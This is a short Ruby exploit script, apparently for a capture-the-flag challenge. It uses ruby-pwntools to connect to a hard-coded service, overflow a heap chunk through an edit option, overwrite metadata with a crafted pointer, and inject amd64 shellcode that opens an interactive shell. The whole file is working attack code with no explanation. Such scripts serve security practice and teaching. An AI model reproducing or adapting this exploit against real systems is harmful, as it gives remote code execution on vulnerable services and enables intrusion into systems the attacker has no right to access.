#!/usr/bin/env ruby
#encoding: ascii-8bit
require_relative '../zocket/zocket'
require 'pwn'      # https://github.com/peter50216/ruby-pwntools
require 'heapinfo' # https://github.com/david942j/heapinfo

$HOST, $PORT = '110.10.212.137', 3335
$local = false
($HOST = '0'; $local = true) if ARGV.empty?
$z = Zocket.new $HOST,$PORT, logger: HexLogger.new
def z;$z;end
$h = heapinfo('')
def h;$h;end
#================= Exploit Start ====================
def pt; z.gets '>> ', do_log: false; end

def add(size, data)
  pt
  z.puts 'L'
  z.gets 'size'
  z.puts size
  z.gets "msg"
  z.write data
end
add(32, 'A'*32)
add(32, 'B'*32)

pt
z.puts 'C'
z.puts 0
z.puts 32 + 8*4+1
context.arch='amd64'
z.write asm("jmp k\n"+"nop\n"*14+"k:"+shellcraft.sh).ljust(48,"\x00") + 0x49.p64 + (0x6020C8+32-224+0x58).p64 + 0x30.chr

pt
z.puts 'R'
z.puts 1

z.interact
